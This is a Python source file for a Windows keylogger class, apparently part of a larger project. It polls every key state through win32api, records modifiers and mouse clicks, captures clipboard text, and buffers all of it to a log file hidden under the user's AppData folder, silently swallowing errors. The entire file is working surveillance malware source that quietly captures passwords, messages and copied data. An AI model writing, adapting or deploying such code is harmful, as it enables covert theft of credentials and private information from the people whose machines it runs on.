import os
import sys
import threading
import time
from collections import deque

if sys.platform == "win32":
    script_dir = os.path.dirname(os.path.abspath(__file__))
    python_dir = os.path.join(script_dir, "python")
    site_packages = os.path.join(python_dir, "Lib", "site-packages")
    if os.path.exists(site_packages):
        if site_packages not in sys.path:
            sys.path.insert(0, site_packages)
        
        win32_dir = os.path.join(site_packages, "win32")
        if os.path.exists(win32_dir) and win32_dir not in sys.path:
            sys.path.insert(0, win32_dir)
        
        pywin32_system32 = os.path.join(site_packages, "pywin32_system32")
        if os.path.exists(pywin32_system32):
            if pywin32_system32 not in sys.path:
                sys.path.insert(0, pywin32_system32)
            try:
                os.add_dll_directory(pywin32_system32)
            except (AttributeError, OSError):
                pass
            try:
                dll_path = os.environ.get("PATH", "")
                if pywin32_system32 not in dll_path:
                    os.environ["PATH"] = pywin32_system32 + os.pathsep + dll_path
            except Exception:
                pass
            
            try:
                import pywintypes  # type: ignore
            except ImportError:
                try:
                    import ctypes
                    pywintypes_dll = os.path.join(pywin32_system32, "pywintypes314.dll")
                    if os.path.exists(pywintypes_dll):
                        ctypes.CDLL(pywintypes_dll)
                except Exception:
                    pass

try:
    if sys.platform == "win32":
        try:
            import win32api  # type: ignore
        except ImportError:
            try:
                from win32 import win32api  # type: ignore
                sys.modules['win32api'] = win32api
            except ImportError:
                import win32  # type: ignore
                import win32api  # type: ignore
        HAS_WIN32 = True
    else:
        HAS_WIN32 = False
except (ImportError, OSError, AttributeError):
    HAS_WIN32 = False

class Keylogger:
    def __init__(self, log_path=None):
        self.log_path = log_path or self._get_default_log_path()
        self.running = False
        self.thread = None
        self.ctrl_pressed = False
        self.alt_pressed = False
        self.shift_pressed = False
        self.caps_lock = False
        
        self.last_mouse_buttons = set()
        
        self.log_buffer = deque(maxlen=2000)
        self.buffer_lock = threading.Lock()
        self.buffer_size_threshold = 500
        self.last_flush_time = time.time()
        self.flush_interval = 1.0
        
        self.last_activity_time = time.time()
        self.inactivity_threshold = 30
        self.last_newline_time = 0
        
        self.relevant_keys = set(range(1, 256))
        self.modifier_keys = {16, 17, 18, 20, 160, 161, 162, 163, 164, 165, 91, 92}
        
        self.newline_added_for_inactivity = False
        self.last_inactivity_newline_time = 0
        
        self.flusher_thread = None
        
        log_dir = os.path.dirname(self.log_path)
        if log_dir:
            os.makedirs(log_dir, exist_ok=True)
    
    def _get_default_log_path(self):
        try:
            from config import KEYLOGGER_DIR, KEYLOGGER_LOG_FILE
            from utils import get_user_profile, get_app_data_path
            if sys.platform == "win32":
                user_profile = get_user_profile()
                if user_profile:
                    local_appdata = get_app_data_path(user_profile, True)
                    return os.path.join(local_appdata, KEYLOGGER_DIR, KEYLOGGER_LOG_FILE)
        except Exception as e:
            pass
        return os.path.join(os.getcwd(), "keylogger.log")
    
    def _add_to_buffer(self, text):
        current_time = time.time()
        
        with self.buffer_lock:
            time_since_activity = current_time - self.last_activity_time
            if time_since_activity > self.inactivity_threshold:
                if not self.newline_added_for_inactivity:
                    if self.log_buffer:
                        self.log_buffer.append("\n")
                        self.newline_added_for_inactivity = True
                        self.last_inactivity_newline_time = current_time
            
            if text != "\n":
                self.newline_added_for_inactivity = False
                self.last_activity_time = current_time
            
            self.log_buffer.append(text)
            
            if len(self.log_buffer) >= self.buffer_size_threshold:
                self._flush_buffer()
    
    def _add_newline_to_buffer(self):
        current_time = time.time()
        with self.buffer_lock:
            if self.log_buffer:
                self.log_buffer.append("\n")
                self.last_activity_time = current_time
                self.newline_added_for_inactivity = False
    
    def _flush_buffer(self):
        with self.buffer_lock:
            if not self.log_buffer:
                return
            content = ''.join(self.log_buffer)
            self.log_buffer.clear()
            try:
                with open(self.log_path, "a", encoding="utf-8") as f:
                    f.write(content)
                    f.flush()
            except (OSError, IOError, PermissionError):
                pass
    
    def _buffer_flusher(self):
        while self.running:
            time.sleep(self.flush_interval)
            current_time = time.time()
            if current_time - self.last_flush_time >= self.flush_interval:
                self._flush_buffer()
                self.last_flush_time = current_time
    
    def _is_special_key(self, key_code):
        special_keys = [8, 9, 13, 27, 37, 38, 39, 40, 46, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 33, 34, 35, 36, 45, 91, 92]
        numpad_keys = [96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 109, 110, 111]
        special_keys.extend(numpad_keys)
        return key_code in special_keys
    
    def _get_key_name(self, key_code, shift=False, caps=False):
        key_map = {
            8: "backspace", 9: "tab", 13: "enter", 27: "escape", 32: " ",
            46: "delete", 37: "left", 38: "up", 39: "right", 40: "down",
            112: "f1", 113: "f2", 114: "f3", 115: "f4", 116: "f5", 117: "f6",
            118: "f7", 119: "f8", 120: "f9", 121: "f10", 122: "f11", 123: "f12",
            33: "pageup", 34: "pagedown", 35: "end", 36: "home", 45: "insert",
            91: "win", 92: "win",
            96: "numpad0", 97: "numpad1", 98: "numpad2", 99: "numpad3", 100: "numpad4",
            101: "numpad5", 102: "numpad6", 103: "numpad7", 104: "numpad8", 105: "numpad9",
            106: "numpad*", 107: "numpad+", 109: "numpad-", 110: "numpad.", 111: "numpad/",
            186: ";", 187: "=", 188: ",", 189: "-", 190: ".", 191: "/", 192: "`",
            219: "[", 220: "\\", 221: "]", 222: "'"
        }
        if key_code in key_map:
            mapped = key_map[key_code]
            if key_code in [186, 187, 188, 189, 190, 191, 192, 219, 220, 221, 222]:
                oem_shift_map = {
                    186: ":",
                    187: "+",
                    188: "<",
                    189: "_",
                    190: ">",
                    191: "?",
                    192: "~",
                    219: "{",
                    220: "|",
                    221: "}",
                    222: '"'
                }
                if shift and key_code in oem_shift_map:
                    return oem_shift_map[key_code]
            return mapped
        
        if 65 <= key_code <= 90:
            base_char = chr(key_code).lower()
            should_uppercase = (shift != caps)
            return base_char.upper() if should_uppercase else base_char
        
        if 32 <= key_code <= 126:
            char = chr(key_code)
            
            shift_map = {
                '1': '!', '2': '@', '3': '#', '4': '$', '5': '%',
                '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
                '-': '_', '=': '+', '[': '{', ']': '}', '\\': '|',
                ';': ':', "'": '"', ',': '<', '.': '>', '/': '?',
                '`': '~'
            }
            
            if shift and char in shift_map:
                return shift_map[char]
            
            return char
        
        return f"key:{key_code}"
    
    def _key_to_string(self, key_code):
        if key_code in {16, 17, 18, 20, 160, 161, 162, 163, 164, 165}:
            return None
        
        key_name = self._get_key_name(key_code, self.shift_pressed, self.caps_lock)
        if not key_name:
            return f"[key:{key_code}]"
        
        is_special = self._is_special_key(key_code)
        is_printable = not is_special and len(key_name) == 1 and key_name not in ["\n", "\t"]
        
        if key_name == " ":
            return " "
        
        if key_name.startswith("key:"):
            return f"[{key_name}]"
        
        mods = []
        if self.ctrl_pressed:
            mods.append("ctrl")
        if self.alt_pressed:
            mods.append("alt")
        
        if is_printable:
            if mods:
                return f"[{'+'.join(mods)}+{key_name}]"
            return key_name
        
        if self.shift_pressed and not is_printable:
            mods.append("shift")
        
        if mods:
            return f"[{'+'.join(mods)}+{key_name}]"
        
        if is_special:
            return f"[{key_name}]"
        
        return f"[{key_name}]"
    
    def _monitor_windows(self):
        if not HAS_WIN32:
            return
        try:
            VK_SHIFT = 16
            VK_CONTROL = 17
            VK_MENU = 18
            VK_CAPITAL = 20
            
            VK_LSHIFT = 160
            VK_RSHIFT = 161
            VK_LCONTROL = 162
            VK_RCONTROL = 163
            VK_LMENU = 164
            VK_RMENU = 165
            
            VK_LBUTTON = 0x01
            VK_RBUTTON = 0x02
            VK_MBUTTON = 0x04
            VK_XBUTTON1 = 0x05
            VK_XBUTTON2 = 0x06
            
            last_keys = set()
            error_count = 0
            max_errors = 10
            
            while self.running:
                try:
                    time.sleep(0.01)
                    current_keys = set()
                    current_mouse_buttons = set()
                    
                    try:
                        lshift = win32api.GetKeyState(VK_LSHIFT)
                        rshift = win32api.GetKeyState(VK_RSHIFT)
                        self.shift_pressed = ((lshift & 0x8000) != 0) or ((rshift & 0x8000) != 0)
                        
                        lctrl = win32api.GetKeyState(VK_LCONTROL)
                        rctrl = win32api.GetKeyState(VK_RCONTROL)
                        self.ctrl_pressed = ((lctrl & 0x8000) != 0) or ((rctrl & 0x8000) != 0)
                        
                        lalt = win32api.GetKeyState(VK_LMENU)
                        ralt = win32api.GetKeyState(VK_RMENU)
                        self.alt_pressed = ((lalt & 0x8000) != 0) or ((ralt & 0x8000) != 0)
                        
                        caps_state = win32api.GetKeyState(VK_CAPITAL)
                        self.caps_lock = (caps_state & 0x0001) != 0
                    except Exception:
                        try:
                            shift_state = win32api.GetKeyState(VK_SHIFT)
                            self.shift_pressed = (shift_state & 0x8000) != 0
                            
                            ctrl_state = win32api.GetKeyState(VK_CONTROL)
                            self.ctrl_pressed = (ctrl_state & 0x8000) != 0
                            
                            alt_state = win32api.GetKeyState(VK_MENU)
                            self.alt_pressed = (alt_state & 0x8000) != 0
                            
                            caps_state = win32api.GetKeyState(VK_CAPITAL)
                            self.caps_lock = (caps_state & 0x0001) != 0
                        except Exception:
                            pass
                    
                    mouse_buttons = [VK_LBUTTON, VK_RBUTTON]
                    for btn in mouse_buttons:
                        state = win32api.GetAsyncKeyState(btn)
                        if state & 0x8000:
                            current_mouse_buttons.add(btn)
                            if btn not in self.last_mouse_buttons:
                                self._add_newline_to_buffer()
                        else:
                            current_mouse_buttons.discard(btn)
                    
                    self.last_mouse_buttons = current_mouse_buttons
                    
                    for i in self.relevant_keys:
                        if i in {16, 17, 18, 20, 160, 161, 162, 163, 164, 165}:
                            continue
                        if i in {1, 2}:
                            continue
                        state = win32api.GetAsyncKeyState(i)
                        if state & 0x8000:
                            current_keys.add(i)
                            if i not in last_keys:
                                key_str = self._key_to_string(i)
                                if key_str:
                                    self._add_to_buffer(key_str)
                    
                    last_keys = current_keys
                    error_count = 0
                    time.sleep(0.03)
                    
                except Exception as e:
                    error_count += 1
                    if error_count > max_errors:
                        time.sleep(1)
                    else:
                        time.sleep(0.1)
        except Exception as e:
            pass
    
    def _monitor_clipboard(self):
        if sys.platform == "win32":
            try:
                import win32clipboard
                last_clipboard = ""
                while self.running:
                    try:
                        win32clipboard.OpenClipboard()
                        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                            clipboard_data = win32clipboard.GetClipboardData()
                            if clipboard_data != last_clipboard:
                                self._add_to_buffer(f"[clipboard {clipboard_data}]")
                                last_clipboard = clipboard_data
                        win32clipboard.CloseClipboard()
                    except Exception as e:
                        pass
                    time.sleep(1)
            except ImportError:
                pass
    
    def start(self):
        if self.running:
            return
        self.running = True
        
        self.thread = threading.Thread(target=self._monitor_windows, daemon=True)
        self.thread.start()
        
        threading.Thread(target=self._monitor_clipboard, daemon=True).start()
        
        self.flusher_thread = threading.Thread(target=self._buffer_flusher, daemon=True)
        self.flusher_thread.start()
    
    def stop(self):
        self.running = False
        
        self._flush_buffer()
        
        if self.thread:
            self.thread.join(timeout=1)
        if self.flusher_thread:
            self.flusher_thread.join(timeout=1)
